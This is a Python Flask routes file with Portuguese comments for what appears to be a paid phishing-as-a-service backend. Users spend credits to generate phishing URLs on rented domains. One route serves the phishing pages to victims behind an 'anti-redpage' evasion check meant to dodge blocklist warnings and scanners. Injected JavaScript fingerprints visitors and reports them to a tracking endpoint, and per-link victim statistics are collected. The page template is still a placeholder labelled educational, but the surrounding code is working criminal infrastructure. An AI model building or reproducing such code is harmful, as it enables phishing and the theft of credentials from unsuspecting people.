from flask import Blueprint, request, jsonify
from flask_login import login_required, current_user
from src.models.user import db, GeneratedURL, Script, Domain, UserDomain, Visitor, Log
from src.services.notification_service import NotificationService
from src.services.anti_redpage_service import anti_redpage_service
from src.routes.user import log_action
from datetime import datetime, timedelta
import secrets
import string
import json

urls_bp = Blueprint('urls', __name__)

def generate_unique_suffix(length=8):
    """Gera um sufixo único para URLs"""
    characters = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(characters) for _ in range(length))

@urls_bp.route('/generate', methods=['POST'])
@login_required
def generate_url():
    """Gera uma nova URL única para um script"""
    data = request.get_json()
    
    if not data:
        return jsonify({'error': 'Dados são obrigatórios'}), 400
    
    script_id = data.get('script_id')
    domain_id = data.get('domain_id')
    
    if not script_id or not domain_id:
        return jsonify({'error': 'Script ID e Domain ID são obrigatórios'}), 400
    
    # Verificar se o script existe e está ativo
    script = Script.query.filter_by(id=script_id, is_active=True).first()
    if not script:
        return jsonify({'error': 'Script não encontrado ou inativo'}), 404
    
    # Verificar se o usuário tem acesso ao domínio
    user_domain = UserDomain.query.filter_by(
        user_id=current_user.id,
        domain_id=domain_id
    ).first()
    
    if not user_domain:
        return jsonify({'error': 'Você não tem acesso a este domínio'}), 403
    
    # Verificar se o acesso ao domínio não expirou
    if user_domain.expires_at and datetime.utcnow() > user_domain.expires_at:
        return jsonify({'error': 'Seu acesso a este domínio expirou'}), 403
    
    # Verificar se o usuário tem créditos suficientes
    domain = Domain.query.get(domain_id)
    if current_user.credits < domain.cost_per_use:
        return jsonify({'error': f'Créditos insuficientes. Necessário: {domain.cost_per_use}, Disponível: {current_user.credits}'}), 400
    
    # Verificar limite de rate por hora
    one_hour_ago = datetime.utcnow() - timedelta(hours=1)
    recent_urls = GeneratedURL.query.filter(
        GeneratedURL.user_id == current_user.id,
        GeneratedURL.domain_id == domain_id,
        GeneratedURL.created_at >= one_hour_ago
    ).count()
    
    if recent_urls >= domain.rate_limit_per_hour:
        return jsonify({'error': f'Limite de {domain.rate_limit_per_hour} URLs por hora atingido para este domínio'}), 429
    
    # Gerar sufixo único
    max_attempts = 10
    for _ in range(max_attempts):
        suffix = generate_unique_suffix()
        existing = GeneratedURL.query.filter_by(unique_suffix=suffix).first()
        if not existing:
            break
    else:
        return jsonify({'error': 'Erro ao gerar sufixo único. Tente novamente.'}), 500
    
    # Configurações opcionais
    protection_level = data.get('protection_level', 'medium')
    expires_in_days = data.get('expires_in_days')
    custom_title = data.get('custom_title', '')
    custom_description = data.get('custom_description', '')
    
    # Validar nível de proteção
    valid_levels = ['low', 'medium', 'high']
    if protection_level not in valid_levels:
        protection_level = 'medium'
    
    # Calcular data de expiração
    expires_at = None
    if expires_in_days and expires_in_days > 0:
        expires_at = datetime.utcnow() + timedelta(days=expires_in_days)
    
    # Criar URL
    full_url = f"https://{domain.domain_name}/{suffix}"
    
    generated_url = GeneratedURL(
        user_id=current_user.id,
        script_id=script_id,
        domain_id=domain_id,
        unique_suffix=suffix,
        full_url=full_url,
        protection_level=protection_level,
        expires_at=expires_at,
        custom_title=custom_title,
        custom_description=custom_description
    )
    
    db.session.add(generated_url)
    
    # Debitar créditos
    current_user.credits -= domain.cost_per_use
    
    # Atualizar estatísticas do domínio
    domain.total_urls_generated += 1
    domain.last_used = datetime.utcnow()
    
    # Atualizar estatísticas do usuário-domínio
    user_domain.usage_count += 1
    user_domain.last_used = datetime.utcnow()
    
    db.session.commit()
    
    # Registrar no log
    log_action('URL_GENERATED', f'URL gerada: {full_url} (Script: {script.name})', current_user.id)
    
    # Notificar usuário se configurado
    try:
        if current_user.receive_notifications and current_user.get_notification_chat_id():
            message = f"""
🔗 <b>Nova URL Gerada!</b>

📱 <b>Script:</b> {script.name}
🌐 <b>Domínio:</b> {domain.domain_name}
🔗 <b>URL:</b> <code>{full_url}</code>
🛡️ <b>Proteção:</b> {protection_level}
💰 <b>Créditos restantes:</b> {current_user.credits}

<i>URL pronta para uso!</i>
            """
            # Criar notificação in-app
            NotificationService.notify_url_generated(current_user.id, {
                'id': generated_url.id,
                'url': generated_url.full_url,
                'script': script.name,
                'domain': domain.domain_name
            })
    except Exception as e:
        print(f"Erro ao enviar notificação: {e}")
    
    return jsonify({
        'message': 'URL gerada com sucesso',
        'url': generated_url.to_dict(),
        'remaining_credits': current_user.credits
    }), 201

@urls_bp.route('/my-urls', methods=['GET'])
@login_required
def get_my_urls():
    """Lista URLs do usuário atual"""
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 20, type=int)
    script_id = request.args.get('script_id', type=int)
    domain_id = request.args.get('domain_id', type=int)
    active_only = request.args.get('active_only', 'false').lower() == 'true'
    
    # Construir query
    query = GeneratedURL.query.filter_by(user_id=current_user.id)
    
    # Aplicar filtros
    if script_id:
        query = query.filter_by(script_id=script_id)
    
    if domain_id:
        query = query.filter_by(domain_id=domain_id)
    
    if active_only:
        now = datetime.utcnow()
        query = query.filter(
            db.or_(
                GeneratedURL.expires_at.is_(None),
                GeneratedURL.expires_at > now
            )
        )
    
    # Ordenar por data de criação (mais recentes primeiro)
    urls_paginated = query.order_by(GeneratedURL.created_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    
    # Adicionar informações extras para cada URL
    urls_with_stats = []
    for url in urls_paginated.items:
        url_dict = url.to_dict()
        url_dict['script'] = url.script.to_dict()
        url_dict['domain'] = url.domain.to_dict()
        url_dict['is_expired'] = url.expires_at and datetime.utcnow() > url.expires_at if url.expires_at else False
        url_dict['visitors_count'] = len(url.visitors)
        url_dict['unique_visitors'] = len(set(v.ip_address for v in url.visitors))
        urls_with_stats.append(url_dict)
    
    return jsonify({
        'urls': urls_with_stats,
        'total': urls_paginated.total,
        'pages': urls_paginated.pages,
        'current_page': page,
        'has_next': urls_paginated.has_next,
        'has_prev': urls_paginated.has_prev
    }), 200

@urls_bp.route('/<int:url_id>', methods=['GET'])
@login_required
def get_url_details(url_id):
    """Obtém detalhes de uma URL específica"""
    generated_url = GeneratedURL.query.filter_by(
        id=url_id,
        user_id=current_user.id
    ).first_or_404()
    
    # Obter estatísticas detalhadas
    visitors = Visitor.query.filter_by(generated_url_id=url_id).order_by(Visitor.last_visit.desc()).all()
    
    # Estatísticas por país
    country_stats = {}
    for visitor in visitors:
        country = visitor.country or 'Desconhecido'
        country_stats[country] = country_stats.get(country, 0) + visitor.visit_count
    
    # Estatísticas por navegador
    browser_stats = {}
    for visitor in visitors:
        browser = visitor.browser_name or 'Desconhecido'
        browser_stats[browser] = browser_stats.get(browser, 0) + visitor.visit_count
    
    # Estatísticas por sistema operacional
    os_stats = {}
    for visitor in visitors:
        os_name = visitor.os_name or 'Desconhecido'
        os_stats[os_name] = os_stats.get(os_name, 0) + visitor.visit_count
    
    # Estatísticas por dispositivo
    device_stats = {}
    for visitor in visitors:
        device = visitor.device_type or 'Desconhecido'
        device_stats[device] = device_stats.get(device, 0) + visitor.visit_count
    
    # Acessos por dia (últimos 30 dias)
    thirty_days_ago = datetime.utcnow() - timedelta(days=30)
    daily_visits = {}
    
    for visitor in visitors:
        if visitor.first_visit >= thirty_days_ago:
            date_key = visitor.first_visit.strftime('%Y-%m-%d')
            daily_visits[date_key] = daily_visits.get(date_key, 0) + visitor.visit_count
    
    # Detecção de bots
    bot_visitors = [v for v in visitors if v.is_bot]
    human_visitors = [v for v in visitors if not v.is_bot]
    
    url_dict = generated_url.to_dict()
    url_dict['script'] = generated_url.script.to_dict()
    url_dict['domain'] = generated_url.domain.to_dict()
    url_dict['is_expired'] = generated_url.expires_at and datetime.utcnow() > generated_url.expires_at if generated_url.expires_at else False
    
    return jsonify({
        'url': url_dict,
        'statistics': {
            'total_visits': sum(v.visit_count for v in visitors),
            'unique_visitors': len(visitors),
            'human_visitors': len(human_visitors),
            'bot_visitors': len(bot_visitors),
            'countries': country_stats,
            'browsers': browser_stats,
            'operating_systems': os_stats,
            'devices': device_stats,
            'daily_visits': daily_visits
        },
        'recent_visitors': [v.to_dict() for v in visitors[:10]]  # Últimos 10 visitantes
    }), 200

@urls_bp.route('/<int:url_id>', methods=['PUT'])
@login_required
def update_url(url_id):
    """Atualiza configurações de uma URL"""
    generated_url = GeneratedURL.query.filter_by(
        id=url_id,
        user_id=current_user.id
    ).first_or_404()
    
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Dados são obrigatórios'}), 400
    
    # Campos atualizáveis
    updatable_fields = ['protection_level', 'custom_title', 'custom_description']
    
    for field in updatable_fields:
        if field in data:
            setattr(generated_url, field, data[field])
    
    # Atualizar data de expiração se fornecida
    if 'expires_in_days' in data:
        expires_in_days = data['expires_in_days']
        if expires_in_days and expires_in_days > 0:
            generated_url.expires_at = datetime.utcnow() + timedelta(days=expires_in_days)
        else:
            generated_url.expires_at = None
    
    db.session.commit()
    
    # Registrar no log
    log_action('URL_UPDATED', f'URL atualizada: {generated_url.full_url}', current_user.id)
    
    return jsonify({
        'message': 'URL atualizada com sucesso',
        'url': generated_url.to_dict()
    }), 200

@urls_bp.route('/<int:url_id>', methods=['DELETE'])
@login_required
def delete_url(url_id):
    """Remove uma URL (soft delete)"""
    generated_url = GeneratedURL.query.filter_by(
        id=url_id,
        user_id=current_user.id
    ).first_or_404()
    
    # Marcar como expirada ao invés de deletar
    generated_url.expires_at = datetime.utcnow()
    db.session.commit()
    
    # Registrar no log
    log_action('URL_DELETED', f'URL removida: {generated_url.full_url}', current_user.id)
    
    return jsonify({'message': 'URL removida com sucesso'}), 200

@urls_bp.route('/scripts', methods=['GET'])
@login_required
def get_available_scripts():
    """Lista scripts disponíveis para o usuário"""
    scripts = Script.query.filter_by(is_active=True).all()
    
    return jsonify({
        'scripts': [script.to_dict() for script in scripts],
        'total': len(scripts)
    }), 200

@urls_bp.route('/domains', methods=['GET'])
@login_required
def get_available_domains():
    """Lista domínios disponíveis para o usuário"""
    # Obter domínios que o usuário tem acesso
    user_domains = []
    
    for user_domain in current_user.user_domains:
        # Verificar se o acesso não expirou
        if not user_domain.expires_at or datetime.utcnow() <= user_domain.expires_at:
            domain_dict = user_domain.domain.to_dict()
            domain_dict['access_info'] = user_domain.to_dict()
            user_domains.append(domain_dict)
    
    return jsonify({
        'domains': user_domains,
        'total': len(user_domains)
    }), 200

@urls_bp.route('/statistics', methods=['GET'])
@login_required
def get_user_statistics():
    """Obtém estatísticas gerais do usuário"""
    # URLs do usuário
    user_urls = GeneratedURL.query.filter_by(user_id=current_user.id).all()
    
    # URLs ativas (não expiradas)
    now = datetime.utcnow()
    active_urls = [url for url in user_urls if not url.expires_at or url.expires_at > now]
    
    # Total de visitantes
    total_visitors = 0
    total_visits = 0
    unique_ips = set()
    
    for url in user_urls:
        for visitor in url.visitors:
            total_visits += visitor.visit_count
            unique_ips.add(visitor.ip_address)
        total_visitors += len(url.visitors)
    
    # Scripts mais utilizados
    script_usage = {}
    for url in user_urls:
        script_name = url.script.name
        script_usage[script_name] = script_usage.get(script_name, 0) + url.access_count
    
    # Domínios mais utilizados
    domain_usage = {}
    for url in user_urls:
        domain_name = url.domain.domain_name
        domain_usage[domain_name] = domain_usage.get(domain_name, 0) + url.access_count
    
    # URLs criadas por mês (últimos 12 meses)
    twelve_months_ago = datetime.utcnow() - timedelta(days=365)
    monthly_creation = {}
    
    for url in user_urls:
        if url.created_at >= twelve_months_ago:
            month_key = url.created_at.strftime('%Y-%m')
            monthly_creation[month_key] = monthly_creation.get(month_key, 0) + 1
    
    return jsonify({
        'general_stats': {
            'total_urls': len(user_urls),
            'active_urls': len(active_urls),
            'expired_urls': len(user_urls) - len(active_urls),
            'total_visitors': total_visitors,
            'total_visits': total_visits,
            'unique_ips': len(unique_ips),
            'current_credits': current_user.credits
        },
        'script_usage': script_usage,
        'domain_usage': domain_usage,
        'monthly_creation': monthly_creation,
        'top_performing_urls': [
            {
                'url': url.full_url,
                'script': url.script.name,
                'visits': url.access_count,
                'visitors': len(url.visitors)
            }
            for url in sorted(user_urls, key=lambda x: x.access_count, reverse=True)[:5]
        ]
    }), 200

@urls_bp.route('/bulk-operations', methods=['POST'])
@login_required
def bulk_url_operations():
    """Executa operações em lote nas URLs do usuário"""
    data = request.get_json()
    
    if not data or not data.get('operation'):
        return jsonify({'error': 'Operação é obrigatória'}), 400
    
    operation = data['operation']
    url_ids = data.get('url_ids', [])
    
    if not url_ids:
        return jsonify({'error': 'IDs das URLs são obrigatórios'}), 400
    
    # Verificar se todas as URLs pertencem ao usuário
    urls = GeneratedURL.query.filter(
        GeneratedURL.id.in_(url_ids),
        GeneratedURL.user_id == current_user.id
    ).all()
    
    if len(urls) != len(url_ids):
        return jsonify({'error': 'Algumas URLs não foram encontradas ou não pertencem a você'}), 404
    
    if operation == 'delete':
        # Marcar URLs como expiradas
        for url in urls:
            url.expires_at = datetime.utcnow()
        
        db.session.commit()
        log_action('BULK_URL_DELETE', f'{len(urls)} URLs removidas em lote', current_user.id)
        return jsonify({'message': f'{len(urls)} URLs removidas com sucesso'}), 200
    
    elif operation == 'extend_expiration':
        # Estender expiração das URLs
        days = data.get('days', 30)
        extension = timedelta(days=days)
        
        for url in urls:
            if url.expires_at:
                url.expires_at += extension
            else:
                url.expires_at = datetime.utcnow() + extension
        
        db.session.commit()
        log_action('BULK_URL_EXTEND', f'{len(urls)} URLs estendidas por {days} dias', current_user.id)
        return jsonify({'message': f'Expiração de {len(urls)} URLs estendida por {days} dias'}), 200
    
    elif operation == 'update_protection':
        # Atualizar nível de proteção
        protection_level = data.get('protection_level', 'medium')
        valid_levels = ['low', 'medium', 'high']
        
        if protection_level not in valid_levels:
            return jsonify({'error': 'Nível de proteção inválido'}), 400
        
        for url in urls:
            url.protection_level = protection_level
        
        db.session.commit()
        log_action('BULK_URL_PROTECTION', f'{len(urls)} URLs com proteção atualizada para {protection_level}', current_user.id)
        return jsonify({'message': f'Proteção de {len(urls)} URLs atualizada para {protection_level}'}), 200
    
    else:
        return jsonify({'error': 'Operação inválida'}), 400

@urls_bp.route('/export', methods=['GET'])
@login_required
def export_urls():
    """Exporta URLs do usuário em formato JSON"""
    format_type = request.args.get('format', 'json')
    include_stats = request.args.get('include_stats', 'false').lower() == 'true'
    
    user_urls = GeneratedURL.query.filter_by(user_id=current_user.id).all()
    
    export_data = []
    for url in user_urls:
        url_data = {
            'url': url.full_url,
            'script': url.script.name,
            'domain': url.domain.domain_name,
            'created_at': url.created_at.isoformat(),
            'expires_at': url.expires_at.isoformat() if url.expires_at else None,
            'protection_level': url.protection_level,
            'custom_title': url.custom_title,
            'custom_description': url.custom_description
        }
        
        if include_stats:
            url_data['statistics'] = {
                'access_count': url.access_count,
                'last_access': url.last_access.isoformat() if url.last_access else None,
                'visitors_count': len(url.visitors),
                'unique_visitors': len(set(v.ip_address for v in url.visitors))
            }
        
        export_data.append(url_data)
    
    # Registrar no log
    log_action('URLS_EXPORTED', f'{len(export_data)} URLs exportadas (formato: {format_type})', current_user.id)
    
    if format_type == 'csv':
        # TODO: Implementar exportação CSV se necessário
        return jsonify({'error': 'Formato CSV não implementado ainda'}), 501
    
    return jsonify({
        'export_date': datetime.utcnow().isoformat(),
        'user': current_user.username,
        'total_urls': len(export_data),
        'urls': export_data
    }), 200

# Rota para servir as páginas de phishing (acessada pelos visitantes)
@urls_bp.route('/<suffix>')
def serve_phishing_page(suffix):
    """Serve a página de phishing para visitantes"""
    # Buscar URL pelo sufixo
    generated_url = GeneratedURL.query.filter_by(unique_suffix=suffix).first()
    
    if not generated_url:
        return "Página não encontrada", 404
    
    # Verificar se a URL não expirou
    if generated_url.expires_at and datetime.utcnow() > generated_url.expires_at:
        return "Esta página expirou", 410
    
    # Aplicar proteções anti-redpage se habilitadas
    if generated_url.is_protected:
        protection_result = anti_redpage_service.check_visitor_protection(
            request, generated_url.protection_level
        )
        
        if not protection_result['allowed']:
            # Registrar tentativa bloqueada
            log_action('ACCESS_BLOCKED', f'Acesso bloqueado para {generated_url.full_url}: {protection_result["reason"]}', None)
            return protection_result['response'], protection_result['status_code']
    
    # Atualizar contador de acesso
    generated_url.access_count += 1
    generated_url.last_access = datetime.utcnow()
    db.session.commit()
    
    # Registrar visitante (será feito pelo sistema de tracking)
    
    # Carregar e servir o script de phishing
    try:
        # Por enquanto, retornar uma página simples
        # TODO: Implementar carregamento real dos scripts de phishing
        page_content = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{generated_url.custom_title or generated_url.script.name}</title>
    <meta name="description" content="{generated_url.custom_description or generated_url.script.description}">
</head>
<body>
    <h1>{generated_url.script.name}</h1>
    <p>Esta é uma página de demonstração para fins educacionais.</p>
    <p>Script: {generated_url.script.name}</p>
    <p>Domínio: {generated_url.domain.domain_name}</p>
    
    <!-- JavaScript para coleta de informações -->
    <script>
        // Coletar informações do visitante
        const visitorInfo = {{
            url_suffix: '{suffix}',
            screen_resolution: screen.width + 'x' + screen.height,
            color_depth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            java_enabled: navigator.javaEnabled(),
            cookies_enabled: navigator.cookieEnabled,
            user_agent: navigator.userAgent,
            referrer: document.referrer
        }};
        
        // Enviar informações para o servidor
        fetch('/api/tracking/visit', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json'
            }},
            body: JSON.stringify(visitorInfo)
        }});
    </script>
</body>
</html>
        """
        
        return page_content
        
    except Exception as e:
        log_action('SCRIPT_LOAD_ERROR', f'Erro ao carregar script para {generated_url.full_url}: {str(e)}', None)
        return "Erro interno do servidor", 500

